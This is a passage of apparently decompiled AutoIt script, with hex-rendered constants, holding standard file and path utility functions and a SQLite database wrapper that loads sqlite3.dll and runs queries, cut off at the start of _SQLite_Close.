    If Not (IsBool($boverwrite) Or $boverwrite = 0x0 Or $boverwrite = 0x1) Then Return SetError(0x5, 0x0, 0x0)
    If Not IsString($stext) Then
        $stext = String($stext)
        If $stext = "" Then Return SetError(0x6, 0x0, 0x0)
    EndIf
    If Not IsBool($bfill) Then Return SetError(0x7, 0x0, 0x0)
    Local $aarray = FileReadToArray($sfilepath)
    If @error Then Local $aarray[0x0]
    Local $iubound = UBound($aarray) + 0xffffffff
    If $bfill Then
        If $iubound < $iline Then
            ReDim $aarray[$iline]
            $iubound = $iline + 0xffffffff
        EndIf
    Else
        If ($iubound + 0x1) < $iline Then Return SetError(0x1, 0x0, 0x0)
    EndIf
    $aarray[$iline + 0xffffffff] = ($boverwrite ? $stext : $stext & @CRLF & $aarray[$iline + 0xffffffff])
    Local $sdata = ""
    For $i = 0x0 To $iubound
        $sdata &= $aarray[$i] & @CRLF
    Next
    $sdata = StringTrimRight($sdata, StringLen(@CRLF))
    Local $hfileopen = FileOpen($sfilepath, FileGetEncoding($sfilepath) + $fo_overwrite)
    If $hfileopen = +0xffffffff Then Return SetError(0x3, 0x0, 0x0)
    FileWrite($hfileopen, $sdata)
    FileClose($hfileopen)
    Return 0x1
EndFunc   ;==>_FILEWRITETOLINE
Func _PathFull($srelativepath, $sbasepath = @WorkingDir)
    If Not $srelativepath Or $srelativepath = "." Then Return $sbasepath
    Local $sfullpath = StringReplace($srelativepath, "/", "\")
    Local Const $sfullpathconst = $sfullpath
    Local $spath
    Local $brootonly = StringLeft($sfullpath, 0x1) = "\" And StringMid($sfullpath, 0x2, 0x1) <> "\"
    If $sbasepath = Default Then $sbasepath = @WorkingDir
    For $i = 0x1 To 0x2
        $spath = StringLeft($sfullpath, 0x2)
        If $spath = "\\" Then
            $sfullpath = StringTrimLeft($sfullpath, 0x2)
            Local $nserverlen = StringInStr($sfullpath, "\") + 0xffffffff
            $spath = "\\" & StringLeft($sfullpath, $nserverlen)
            $sfullpath = StringTrimLeft($sfullpath, $nserverlen)
            ExitLoop
        ElseIf StringRight($spath, 0x1) = ":" Then
            $sfullpath = StringTrimLeft($sfullpath, 0x2)
            ExitLoop
        Else
            $sfullpath = $sbasepath & "\" & $sfullpath
        EndIf
    Next
    If StringLeft($sfullpath, 0x1) <> "\" Then
        If StringLeft($sfullpathconst, 0x2) = StringLeft($sbasepath, 0x2) Then
            $sfullpath = $sbasepath & "\" & $sfullpath
        Else
            $sfullpath = "\" & $sfullpath
        EndIf
    EndIf
    Local $atemp = StringSplit($sfullpath, "\")
    Local $apathparts[$atemp[0x0]], $j = 0x0
    For $i = 0x2 To $atemp[0x0]
        If $atemp[$i] = ".." Then
            If $j Then $j -= 0x1
        ElseIf Not ($atemp[$i] = "" And $i <> $atemp[0x0]) And $atemp[$i] <> "." Then
            $apathparts[$j] = $atemp[$i]
            $j += 0x1
        EndIf
    Next
    $sfullpath = $spath
    If Not $brootonly Then
        For $i = 0x0 To $j + 0xffffffff
            $sfullpath &= "\" & $apathparts[$i]
        Next
    Else
        $sfullpath &= $sfullpathconst
        If StringInStr($sfullpath, "..") Then $sfullpath = _PathFull($sfullpath)
    EndIf
    Do
        $sfullpath = StringReplace($sfullpath, ".\", "\")
    Until @extended = 0x0
    Return $sfullpath
EndFunc   ;==>_PATHFULL
Func _PathGetRelative($sfrom, $sto)
    If StringRight($sfrom, 0x1) <> "\" Then $sfrom &= "\"
    If StringRight($sto, 0x1) <> "\" Then $sto &= "\"
    If $sfrom = $sto Then Return SetError(0x1, 0x0, StringTrimRight($sto, 0x1))
    Local $asfrom = StringSplit($sfrom, "\")
    Local $asto = StringSplit($sto, "\")
    If $asfrom[0x1] <> $asto[0x1] Then Return SetError(0x2, 0x0, StringTrimRight($sto, 0x1))
    Local $i = 0x2
    Local $idiff = 0x1
    While 0x1
        If $asfrom[$i] <> $asto[$i] Then
            $idiff = $i
            ExitLoop
        EndIf
        $i += 0x1
    WEnd
    $i = 0x1
    Local $srelpath = ""
    For $j = 0x1 To $asto[0x0]
        If $i >= $idiff Then
            $srelpath &= "\" & $asto[$i]
        EndIf
        $i += 0x1
    Next
    $srelpath = StringTrimLeft($srelpath, 0x1)
    $i = 0x1
    For $j = 0x1 To $asfrom[0x0]
        If $i > $idiff Then
            $srelpath = "..\" & $srelpath
        EndIf
        $i += 0x1
    Next
    If StringRight($srelpath, 0x1) == "\" Then $srelpath = StringTrimRight($srelpath, 0x1)
    Return $srelpath
EndFunc   ;==>_PATHGETRELATIVE
Func _PathMake($sdrive, $sdir, $sfilename, $sextension)
    If StringLen($sdrive) Then
        If Not (StringLeft($sdrive, 0x2) = "\\") Then $sdrive = StringLeft($sdrive, 0x1) & ":"
    EndIf
    If StringLen($sdir) Then
        If Not (StringRight($sdir, 0x1) = "\") And Not (StringRight($sdir, 0x1) = "/") Then $sdir = $sdir & "\"
    Else
        $sdir = "\"
    EndIf
    If StringLen($sdir) Then
        If Not (StringLeft($sdir, 0x1) = "\") And Not (StringLeft($sdir, 0x1) = "/") Then $sdir = "\" & $sdir
    EndIf
    If StringLen($sextension) Then
        If Not (StringLeft($sextension, 0x1) = ".") Then $sextension = "." & $sextension
    EndIf
    Return $sdrive & $sdir & $sfilename & $sextension
EndFunc   ;==>_PATHMAKE
Func _PathSplit($sfilepath, ByRef $sdrive, ByRef $sdir, ByRef $sfilename, ByRef $sextension)
    Local $aarray = StringRegExp($sfilepath, "^\h*((?:\\\\\?\\)*(\\\\[^\?\/\\]+|[A-Za-z]:)?(.*[\/\\]\h*)?((?:[^\.\/\\]|(?(?=\.[^\/\\]*\.)\.))*)?([^\/\\]*))$", $str_regexparraymatch)
    If @error Then
        ReDim $aarray[0x5]
        $aarray[$path_original] = $sfilepath
    EndIf
    $sdrive = $aarray[$path_drive]
    If StringLeft($aarray[$path_directory], 0x1) == "/" Then
        $sdir = StringRegExpReplace($aarray[$path_directory], "\h*[\/\\]+\h*", "\/")
    Else
        $sdir = StringRegExpReplace($aarray[$path_directory], "\h*[\/\\]+\h*", "\\")
    EndIf
    $aarray[$path_directory] = $sdir
    $sfilename = $aarray[$path_filename]
    $sextension = $aarray[$path_extension]
    Return $aarray
EndFunc   ;==>_PATHSPLIT
Func _ReplaceStringInFile($sfilepath, $ssearchstring, $sreplacestring, $icasesensitive = 0x0, $ioccurance = 0x1)
    If StringInStr(FileGetAttrib($sfilepath), "R") Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $hfileopen = FileOpen($sfilepath, $fo_read)
    If $hfileopen = +0xffffffff Then Return SetError(0x2, 0x0, +0xffffffff)
    Local $sfileread = FileRead($hfileopen)
    FileClose($hfileopen)
    If $icasesensitive = Default Then $icasesensitive = 0x0
    If $ioccurance = Default Then $ioccurance = 0x1
    $sfileread = StringReplace($sfileread, $ssearchstring, $sreplacestring, 0x1 - $ioccurance, $icasesensitive)
    Local $ireturn = @extended
    If $ireturn Then
        Local $ifileencoding = FileGetEncoding($sfilepath)
        $hfileopen = FileOpen($sfilepath, $ifileencoding + $fo_overwrite)
        If $hfileopen = +0xffffffff Then Return SetError(0x3, 0x0, +0xffffffff)
        FileWrite($hfileopen, $sfileread)
        FileClose($hfileopen)
    EndIf
    Return $ireturn
EndFunc   ;==>_REPLACESTRINGINFILE
Func _TempFile($sdirectoryname = @TempDir, $sfileprefix = "~", $sfileextension = ".tmp", $irandomlength = 0x7)
    If $irandomlength = Default Or $irandomlength <= 0x0 Then $irandomlength = 0x7
    If $sdirectoryname = Default Or (Not FileExists($sdirectoryname)) Then $sdirectoryname = @TempDir
    If $sfileextension = Default Then $sfileextension = ".tmp"
    If $sfileprefix = Default Then $sfileprefix = "~"
    If Not FileExists($sdirectoryname) Then $sdirectoryname = @ScriptDir
    $sdirectoryname = StringRegExpReplace($sdirectoryname, "[\\/]+$", "")
    $sfileextension = StringRegExpReplace($sfileextension, "^\.+", "")
    $sfileprefix = StringRegExpReplace($sfileprefix, '[\\/:*?"<>|]', "")
    Local $stempname = ""
    Do
        $stempname = ""
        While StringLen($stempname) < $irandomlength
            $stempname &= Chr(Random(0x61, 0x7a, 0x1))
        WEnd
        $stempname = $sdirectoryname & "\" & $sfileprefix & $stempname & "." & $sfileextension
    Until Not FileExists($stempname)
    Return $stempname
EndFunc   ;==>_TEMPFILE
Global $__g_hdll_sqlite = 0x0
Global $__g_hdb_sqlite = 0x0
Global $__g_butf8errormsg_sqlite = False
Global $__g_hprintcallback_sqlite = __SQLITE_CONSOLEWRITE
Global $__g_bsafemodestate_sqlite = True
Global $__g_ahdbs_sqlite[0x1] = [""]
Global $__g_ahquerys_sqlite[0x1] = [""]
Global $__g_hmsvcrtdll_sqlite = 0x0
Global $__g_bautoittype_sqlite = False
Global Const $sqlite_ok = 0x0
Global Const $sqlite_error = 0x1
Global Const $sqlite_internal = 0x2
Global Const $sqlite_perm = 0x3
Global Const $sqlite_abort = 0x4
Global Const $sqlite_busy = 0x5
Global Const $sqlite_locked = 0x6
Global Const $sqlite_nomem = 0x7
Global Const $sqlite_readonly = 0x8
Global Const $sqlite_interrupt = 0x9
Global Const $sqlite_ioerr = 0xa
Global Const $sqlite_corrupt = 0xb
Global Const $sqlite_notfound = 0xc
Global Const $sqlite_full = 0xd
Global Const $sqlite_cantopen = 0xe
Global Const $sqlite_protocol = 0xf
Global Const $sqlite_empty = 0x10
Global Const $sqlite_schema = 0x11
Global Const $sqlite_toobig = 0x12
Global Const $sqlite_constraint = 0x13
Global Const $sqlite_mismatch = 0x14
Global Const $sqlite_misuse = 0x15
Global Const $sqlite_nolfs = 0x16
Global Const $sqlite_auth = 0x17
Global Const $sqlite_row = 0x64
Global Const $sqlite_done = 0x65
Global Const $sqlite_open_readonly = 0x1
Global Const $sqlite_open_readwrite = 0x2
Global Const $sqlite_open_create = 0x4
Global Const $sqlite_encoding_utf8 = 0x0
Global Const $sqlite_encoding_utf16 = 0x1
Global Const $sqlite_encoding_utf16be = 0x2
Global Const $sqlite_type_integer = 0x1
Global Const $sqlite_type_float = 0x2
Global Const $sqlite_type_text = 0x3
Global Const $sqlite_type_blob = 0x4
Global Const $sqlite_type_null = 0x5
Func _SQLite_Startup($sdll_filename = "", $butf8errormsg = False, $iforcelocal = 0x0, $hprintcallback = $__g_hprintcallback_sqlite, $bautoittypeconversion = False)
    If $sdll_filename = Default Or $sdll_filename = +0xffffffff Then $sdll_filename = ""
    If $hprintcallback = Default Then $hprintcallback = __SQLITE_CONSOLEWRITE
    $__g_hprintcallback_sqlite = $hprintcallback
    If $butf8errormsg = Default Then $butf8errormsg = False
    $__g_butf8errormsg_sqlite = $butf8errormsg
    If $sdll_filename = "" Then $sdll_filename = "sqlite3.dll"
    If @AutoItX64 And (StringInStr($sdll_filename, "_x64") = 0x0) Then $sdll_filename = StringReplace($sdll_filename, ".dll", "_x64.dll")
    Local $iextended = 0x0
    If Int($iforcelocal) < 0x1 Then
        $sdll_filename = __SQLITE_GETDOWNLOADEDPATH($sdll_filename) & $sdll_filename
        $iextended = @extended
    EndIf
    Local $hdll = DllOpen($sdll_filename)
    If $hdll = +0xffffffff Then
        $__g_hdll_sqlite = 0x0
        Return SetError(0x1, $iextended, "")
    Else
        $__g_hdll_sqlite = $hdll
        Return SetExtended($iextended, $sdll_filename)
    EndIf
    $__g_bautoittype_sqlite = $bautoittypeconversion
EndFunc   ;==>_SQLITE_STARTUP
Func _SQLite_Shutdown()
    If $__g_hdll_sqlite > 0x0 Then DllClose($__g_hdll_sqlite)
    $__g_hdll_sqlite = 0x0
    If $__g_hmsvcrtdll_sqlite > 0x0 Then DllClose($__g_hmsvcrtdll_sqlite)
    $__g_hmsvcrtdll_sqlite = 0x0
EndFunc   ;==>_SQLITE_SHUTDOWN
Func _SQLite_Open($sdatabase_filename = Default, $iaccessmode = Default, $iencoding = Default)
    If Not $__g_hdll_sqlite Then Return SetError(0x3, $sqlite_misuse, 0x0)
    If $sdatabase_filename = Default Or Not IsString($sdatabase_filename) Then $sdatabase_filename = ":memory:"
    Local $tfilename = __SQLITE_STRINGTOUTF8STRUCT($sdatabase_filename)
    If @error Then Return SetError(0x2, @error, 0x0)
    If $iaccessmode = Default Then $iaccessmode = BitOR($sqlite_open_readwrite, $sqlite_open_create)
    Local $boldbase = FileExists($sdatabase_filename)
    If $iencoding = Default Then
        $iencoding = $sqlite_encoding_utf8
    EndIf
    Local $avrval = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_open_v2", "struct*", $tfilename, "ptr*", 0x0, "int", $iaccessmode, "ptr", 0x0)
    If @error Then Return SetError(0x1, @error, 0x0)
    If $avrval[0x0] <> $sqlite_ok Then
        __SQLITE_REPORTERROR($avrval[0x2], "_SQLite_Open")
        _SQLite_Close($avrval[0x2])
        Return SetError(+0xffffffff, $avrval[0x0], 0x0)
    EndIf
    $__g_hdb_sqlite = $avrval[0x2]
    __SQLITE_HADD($__g_ahdbs_sqlite, $avrval[0x2])
    If Not $boldbase Then
        Local $aencoding[0x3] = ["8", "16", "16be"]
        _SQLite_Exec($avrval[0x2], 'PRAGMA encoding="UTF-' & $aencoding[$iencoding] & '";')
    EndIf
    Return SetExtended($avrval[0x0], $avrval[0x2])
EndFunc   ;==>_SQLITE_OPEN
Func _SQLite_GetTable($hdb, $ssql, ByRef $aresult, ByRef $irows, ByRef $icolumns, $icharsize = +0xffffffff)
    $aresult = ""
    If __SQLITE_HCHK($hdb, 0x1) Then Return SetError(@error, 0x0, $sqlite_misuse)
    If $icharsize = "" Or $icharsize < 0x1 Or $icharsize = Default Then $icharsize = +0xffffffff
    Local $hquery
    Local $r = _SQLite_Query($hdb, $ssql, $hquery)
    If @error Then Return SetError(0x2, @error, $r)
    Local $adatarow
    $r = _SQLite_FetchNames($hquery, $adatarow)
    Local $ierror = @error
    If $ierror Then
        _SQLite_QueryFinalize($hquery)
        Return SetError(0x3, $ierror, $r)
    EndIf
    $icolumns = UBound($adatarow)
    Local Const $irowsincr = 0x40
    $irows = 0x0
    Local $iallocrows = $irowsincr
    Dim $aresult[($iallocrows + 0x1) * $icolumns + 0x1]
    For $idx = 0x0 To $icolumns + 0xffffffff
        If $icharsize > 0x0 Then
            $adatarow[$idx] = StringLeft($adatarow[$idx], $icharsize)
        EndIf
        $aresult[$idx + 0x1] = $adatarow[$idx]
    Next
    While 0x1
        $r = _SQLite_FetchData($hquery, $adatarow, 0x0, 0x0, $icolumns)
        $ierror = @error
        Switch $r
            Case $sqlite_ok
                $irows += 0x1
                If $irows = $iallocrows Then
                    $iallocrows = Round($iallocrows * 0x4 / 0x3)
                    ReDim $aresult[($iallocrows + 0x1) * $icolumns + 0x1]
                EndIf
                For $j = 0x0 To $icolumns + 0xffffffff
                    If $icharsize > 0x0 Then
                        $adatarow[$j] = StringLeft($adatarow[$j], $icharsize)
                    EndIf
                    $idx += 0x1
                    $aresult[$idx] = $adatarow[$j]
                Next
            Case $sqlite_done
                ExitLoop
            Case Else
                $aresult = ""
                _SQLite_QueryFinalize($hquery)
                Return SetError(0x4, $ierror, $r)
        EndSwitch
    WEnd
    $aresult[0x0] = ($irows + 0x1) * $icolumns
    ReDim $aresult[$aresult[0x0] + 0x1]
    Return ($sqlite_ok)
EndFunc   ;==>_SQLITE_GETTABLE
Func _SQLite_Exec($hdb, $ssql, $scallback = "")
    If __SQLITE_HCHK($hdb, 0x2) Then Return SetError(@error, 0x0, $sqlite_misuse)
    If $scallback <> "" Then
        Local $irows, $icolumns
        Local $sresult = "SQLITE_CALLBACK:" & $scallback
        Local $irval = _SQLite_GetTable2d($hdb, $ssql, $sresult, $irows, $icolumns)
        If @error Then Return SetError(0x3, @error, $irval)
        Return $irval
    EndIf
    Local $tsql8 = __SQLITE_STRINGTOUTF8STRUCT($ssql)
    If @error Then Return SetError(0x4, @error, 0x0)
    Local $avrval = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_exec", "ptr", $hdb, "struct*", $tsql8, "ptr", 0x0, "ptr", 0x0, "ptr*", 0x0)
    If @error Then Return SetError(0x1, @error, $sqlite_misuse)
    __SQLITE_SZFREE($avrval[0x5])
    If $avrval[0x0] <> $sqlite_ok Then
        __SQLITE_REPORTERROR($hdb, "_SQLite_Exec", $ssql)
        SetError(+0xffffffff)
    EndIf
    Return $avrval[0x0]
EndFunc   ;==>_SQLITE_EXEC
Func _SQLite_LibVersion()
    If $__g_hdll_sqlite = 0x0 Then Return SetError(0x1, $sqlite_misuse, 0x0)
    Local $r = DllCall($__g_hdll_sqlite, "str:cdecl", "sqlite3_libversion")
    If @error Then Return SetError(0x1, @error, 0x0)
    Return $r[0x0]
EndFunc   ;==>_SQLITE_LIBVERSION
Func _SQLite_LastInsertRowID($hdb = +0xffffffff)
    If __SQLITE_HCHK($hdb, 0x2) Then Return SetError(@error, @extended, 0x0)
    Local $r = DllCall($__g_hdll_sqlite, "long:cdecl", "sqlite3_last_insert_rowid", "ptr", $hdb)
    If @error Then Return SetError(0x1, @error, 0x0)
    Return $r[0x0]
EndFunc   ;==>_SQLITE_LASTINSERTROWID
Func _SQLite_Changes($hdb = +0xffffffff)
    If __SQLITE_HCHK($hdb, 0x2) Then Return SetError(@error, @extended, 0x0)
    Local $r = DllCall($__g_hdll_sqlite, "long:cdecl", "sqlite3_changes", "ptr", $hdb)
    If @error Then Return SetError(0x1, @error, 0x0)
    Return $r[0x0]
EndFunc   ;==>_SQLITE_CHANGES
Func _SQLite_TotalChanges($hdb = +0xffffffff)
    If __SQLITE_HCHK($hdb, 0x2) Then Return SetError(@error, @extended, 0x0)
    Local $r = DllCall($__g_hdll_sqlite, "long:cdecl", "sqlite3_total_changes", "ptr", $hdb)
    If @error Then Return SetError(0x1, @error, 0x0)
    Return $r[0x0]
EndFunc   ;==>_SQLITE_TOTALCHANGES
Func _SQLite_ErrCode($hdb = +0xffffffff)
    If __SQLITE_HCHK($hdb, 0x2) Then Return SetError(@error, 0x0, $sqlite_misuse)
    Local $r = DllCall($__g_hdll_sqlite, "long:cdecl", "sqlite3_errcode", "ptr", $hdb)
    If @error Then Return SetError(0x1, @error, $sqlite_misuse)
    Return $r[0x0]
EndFunc   ;==>_SQLITE_ERRCODE
Func _SQLite_ErrMsg($hdb = +0xffffffff)
    If __SQLITE_HCHK($hdb, 0x2) Then Return SetError(@error, @extended, "Library used incorrectly")
    Local $r = DllCall($__g_hdll_sqlite, "wstr:cdecl", "sqlite3_errmsg16", "ptr", $hdb)
    If @error Then
        __SQLITE_REPORTERROR($hdb, "_SQLite_ErrMsg", Default, "Call Failed")
        Return SetError(0x1, @error, "Library used incorrectly")
    EndIf
    Return $r[0x0]
EndFunc   ;==>_SQLITE_ERRMSG
Func _SQLite_Display2DResult($aresult, $icellwidth = 0x0, $breturn = False, $sdelim_col = "", $sdelim_row = @CRLF)
    If Not IsArray($aresult) Or UBound($aresult, $ubound_dimensions) <> 0x2 Or $icellwidth < 0x0 Then Return SetError(0x1, 0x0, "")
    Local $aicellwidth
    If $icellwidth = Default Then $icellwidth = 0x0
    If $sdelim_col = Default Then $sdelim_col = ""
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $icellwidth = 0x0 Or $icellwidth = Default Then
        Local $icellwidthmax
        Dim $aicellwidth[UBound($aresult, $ubound_columns)]
        For $irow = 0x0 To UBound($aresult, $ubound_rows) + 0xffffffff
            For $icol = 0x0 To UBound($aresult, $ubound_columns) + 0xffffffff
                $icellwidthmax = StringLen($aresult[$irow][$icol])
                If $icellwidthmax > $aicellwidth[$icol] Then
                    $aicellwidth[$icol] = $icellwidthmax
                EndIf
            Next
        Next
    EndIf
    Local $sout = "", $icellwidthused
    Local $iubound_rows = UBound($aresult, $ubound_rows) + 0xffffffff
    Local $iubound_cols = UBound($aresult, $ubound_columns) + 0xffffffff
    For $irow = 0x0 To $iubound_rows
        For $icol = 0x0 To $iubound_cols
            If $icellwidth = 0x0 Then
                $icellwidthused = $aicellwidth[$icol]
            Else
                $icellwidthused = $icellwidth
            EndIf
            $sout &= StringFormat(" %-" & $icellwidthused & "." & $icellwidthused & "s ", $aresult[$irow][$icol])
            If $icol <> $iubound_cols Then $sout &= $sdelim_col
        Next
        $sout &= $sdelim_row
        If Not $breturn Then
            __SQLITE_PRINT($sout)
            $sout = ""
        EndIf
    Next
    If $breturn Then
        If $sdelim_col <> "" Then $sout = StringTrimRight($sout, StringLen($sdelim_row))
        Return $sout
    EndIf
EndFunc   ;==>_SQLITE_DISPLAY2DRESULT
Func _SQLite_GetTable2d($hdb, $ssql, ByRef $aresult, ByRef $irows, ByRef $icolumns, $icharsize = +0xffffffff, $bswichdimensions = False)
    If __SQLITE_HCHK($hdb, 0x1) Then Return SetError(@error, 0x0, $sqlite_misuse)
    If $icharsize = "" Or $icharsize < 0x1 Or $icharsize = Default Then $icharsize = +0xffffffff
    Local $scallback = "", $bcallback = False
    If IsString($aresult) Then
        If StringLeft($aresult, 0x10) = "SQLITE_CALLBACK:" Then
            $scallback = StringTrimLeft($aresult, 0x10)
            $bcallback = True
        EndIf
    EndIf
    $aresult = ""
    If $bswichdimensions = Default Then $bswichdimensions = False
    Local $hquery
    Local $r = _SQLite_Query($hdb, $ssql, $hquery)
    If @error Then Return SetError(0x2, @error, $r)
    If $r <> $sqlite_ok Then
        __SQLITE_REPORTERROR($hdb, "_SQLite_GetTable2D", $ssql)
        _SQLite_QueryFinalize($hquery)
        Return SetError(+0xffffffff, 0x0, $r)
    EndIf
    $irows = 0x0
    Local $arval_step, $ierror
    While True
        $arval_step = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_step", "ptr", $hquery)
        If @error Then
            $ierror = @error
            _SQLite_QueryFinalize($hquery)
            Return SetError(0x3, $ierror, $sqlite_misuse)
        EndIf
        Switch $arval_step[0x0]
            Case $sqlite_row
                $irows += 0x1
            Case $sqlite_done
                ExitLoop
            Case Else
                _SQLite_QueryFinalize($hquery)
                Return SetError(0x3, $ierror, $arval_step[0x0])
        EndSwitch
    WEnd
    Local $iret = _SQLite_QueryReset($hquery)
    If @error Then
        $ierror = @error
        _SQLite_QueryFinalize($hquery)
        Return SetError(0x4, $ierror, $iret)
    EndIf
    Local $adatarow
    $r = _SQLite_FetchNames($hquery, $adatarow)
    If @error Then
        $ierror = @error
        _SQLite_QueryFinalize($hquery)
        Return SetError(0x5, $ierror, $r)
    EndIf
    $icolumns = UBound($adatarow)
    If $icolumns <= 0x0 Then
        _SQLite_QueryFinalize($hquery)
        Return SetError(+0xffffffff, 0x0, $sqlite_done)
    EndIf
    If Not $bcallback Then
        If $bswichdimensions Then
            Dim $aresult[$icolumns][$irows + 0x1]
            For $i = 0x0 To $icolumns + 0xffffffff
                If $icharsize > 0x0 Then
                    $adatarow[$i] = StringLeft($adatarow[$i], $icharsize)
                EndIf
                $aresult[$i][0x0] = $adatarow[$i]
            Next
        Else
            Dim $aresult[$irows + 0x1][$icolumns]
            For $i = 0x0 To $icolumns + 0xffffffff
                If $icharsize > 0x0 Then
                    $adatarow[$i] = StringLeft($adatarow[$i], $icharsize)
                EndIf
                $aresult[0x0][$i] = $adatarow[$i]
            Next
        EndIf
    Else
        Local $icbrval
        $icbrval = Call($scallback, $adatarow)
        If $icbrval = $sqlite_abort Or $icbrval = $sqlite_interrupt Or @error Then
            $ierror = @error
            _SQLite_QueryFinalize($hquery)
            Return SetError(0x7, $ierror, $icbrval)
        EndIf
    EndIf
    If $irows > 0x0 Then
        For $i = 0x1 To $irows
            $r = _SQLite_FetchData($hquery, $adatarow, 0x0, 0x0, $icolumns)
            If @error Then
                $ierror = @error
                _SQLite_QueryFinalize($hquery)
                Return SetError(0x6, $ierror, $r)
            EndIf
            If $bcallback Then
                $icbrval = Call($scallback, $adatarow)
                If $icbrval = $sqlite_abort Or $icbrval = $sqlite_interrupt Or @error Then
                    $ierror = @error
                    _SQLite_QueryFinalize($hquery)
                    Return SetError(0x7, $ierror, $icbrval)
                EndIf
            Else
                For $j = 0x0 To $icolumns + 0xffffffff
                    If $icharsize > 0x0 Then
                        $adatarow[$j] = StringLeft($adatarow[$j], $icharsize)
                    EndIf
                    If $bswichdimensions Then
                        $aresult[$j][$i] = $adatarow[$j]
                    Else
                        $aresult[$i][$j] = $adatarow[$j]
                    EndIf
                Next
            EndIf
        Next
    EndIf
    Return (_SQLite_QueryFinalize($hquery))
EndFunc   ;==>_SQLITE_GETTABLE2D
Func _SQLite_SetTimeout($hdb = +0xffffffff, $itimeout = 0x3e8)
    If __SQLITE_HCHK($hdb, 0x2) Then Return SetError(@error, 0x0, $sqlite_misuse)
    If $itimeout = Default Then $itimeout = 0x3e8
    Local $avrval = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_busy_timeout", "ptr", $hdb, "int", $itimeout)
    If @error Then Return SetError(0x1, @error, $sqlite_misuse)
    If $avrval[0x0] <> $sqlite_ok Then SetError(+0xffffffff)
    Return $avrval[0x0]
EndFunc   ;==>_SQLITE_SETTIMEOUT
Func _SQLite_Query($hdb, $ssql, ByRef $hquery)
    If __SQLITE_HCHK($hdb, 0x2) Then Return SetError(@error, 0x0, $sqlite_misuse)
    Local $irval = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_prepare16_v2", "ptr", $hdb, "wstr", $ssql, "int", +0xffffffff, "ptr*", 0x0, "ptr*", 0x0)
    If @error Then Return SetError(0x1, @error, $sqlite_misuse)
    If $irval[0x0] <> $sqlite_ok Then
        __SQLITE_REPORTERROR($hdb, "_SQLite_Query", $ssql)
        Return SetError(+0xffffffff, 0x0, $irval[0x0])
    EndIf
    $hquery = $irval[0x4]
    __SQLITE_HADD($__g_ahquerys_sqlite, $irval[0x4])
    Return $irval[0x0]
EndFunc   ;==>_SQLITE_QUERY
Func _SQLite_FetchData($hquery, ByRef $arow, $bbinary = False, $bdonotfinalize = False, $icolumns = 0x0, $bautoittypeconversion = False)
    Dim $arow[0x1]
    If __SQLITE_HCHK($hquery, 0x7, False) Then Return SetError(@error, 0x0, $sqlite_misuse)
    If $bbinary = Default Then $bbinary = False
    If $bdonotfinalize = Default Then $bdonotfinalize = False
    Local $arval_step = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_step", "ptr", $hquery)
    If @error Then Return SetError(0x1, @error, $sqlite_misuse)
    If $arval_step[0x0] <> $sqlite_row Then
        If $bdonotfinalize = False And $arval_step[0x0] = $sqlite_done Then
            _SQLite_QueryFinalize($hquery)
        EndIf
        Return SetError(+0xffffffff, 0x0, $arval_step[0x0])
    EndIf
    If Not $icolumns Then
        Local $irval_colcnt = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_data_count", "ptr", $hquery)
        If @error Then Return SetError(0x2, @error, $sqlite_misuse)
        If $irval_colcnt[0x0] <= 0x0 Then Return SetError(+0xffffffff, 0x0, $sqlite_done)
        $icolumns = $irval_colcnt[0x0]
    EndIf
    ReDim $arow[$icolumns]
    If Not $bautoittypeconversion Then $bautoittypeconversion = $__g_bautoittype_sqlite
    For $i = 0x0 To $icolumns + 0xffffffff
        Local $irval_coltype = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_column_type", "ptr", $hquery, "int", $i)
        If @error Then Return SetError(0x4, @error, $sqlite_misuse)
        If $irval_coltype[0x0] = $sqlite_type_null Then
            $arow[$i] = ""
            ContinueLoop
        EndIf
        If (Not $bbinary) And ($irval_coltype[0x0] <> $sqlite_type_blob) Then
            Local $vrval
            If $bautoittypeconversion Then
                Switch $irval_coltype[0x0]
                    Case $sqlite_type_null
                        $arow[$i] = Null
                    Case $sqlite_type_integer
                        $vrval = DllCall($__g_hdll_sqlite, "int64:cdecl", "sqlite3_column_int64", "ptr", $hquery, "int", $i)
                        If @error Then Return SetError(0x8, 0x0, $sqlite_misuse)
                        $arow[$i] = $vrval[0x0]
                    Case $sqlite_type_float
                        $vrval = DllCall($__g_hdll_sqlite, "double:cdecl", "sqlite3_column_double", "ptr", $hquery, "int", $i)
                        If @error Then Return SetError(0x9, 0x0, $sqlite_misuse)
                        $arow[$i] = $vrval[0x0]
                    Case $sqlite_type_blob
                        Local $pblob = DllCall($__g_hdll_sqlite, "ptr:cdecl", "sqlite3_column_blob", "ptr", $hquery, "int", $i)
                        If @error Then Return SetError(0x10, @error, $sqlite_misuse)
                        Local $iblobsize = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_column_bytes", "ptr", $hquery, "int", $i)
                        If @error Then Return SetError(0xf, @error, $sqlite_misuse)
                        $arow[$i] = Binary(DllStructGetData(DllStructCreate("byte[" & $iblobsize[0x0] & "]", $pblob[0x0]), 0x1))
                    Case $sqlite_type_text
                        $vrval = DllCall($__g_hdll_sqlite, "wstr:cdecl", "sqlite3_column_text16", "ptr", $hquery, "int", $i)
                        If @error Then Return SetError(0xd, @error, $sqlite_misuse)
                        $arow[$i] = $vrval[0x0]
                EndSwitch
            Else
                $vrval = DllCall($__g_hdll_sqlite, "wstr:cdecl", "sqlite3_column_text16", "ptr", $hquery, "int", $i)
                If @error Then Return SetError(0x3, @error, $sqlite_misuse)
                $arow[$i] = $vrval[0x0]
            EndIf
        Else
            Local $acall = DllCall($__g_hdll_sqlite, "ptr:cdecl", "sqlite3_column_blob", "ptr", $hquery, "int", $i)
            If @error Then Return SetError(0x6, @error, $sqlite_misuse)
            Local $icolbytes = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_column_bytes", "ptr", $hquery, "int", $i)
            If @error Then Return SetError(0x5, @error, $sqlite_misuse)
            Local $tresultstruct = DllStructCreate("byte[" & $icolbytes[0x0] & "]", $acall[0x0])
            $arow[$i] = Binary(DllStructGetData($tresultstruct, 0x1))
        EndIf
    Next
    Return $sqlite_ok
EndFunc   ;==>_SQLITE_FETCHDATA
Func _SQLite_Close($hdb = +0xffffffff)
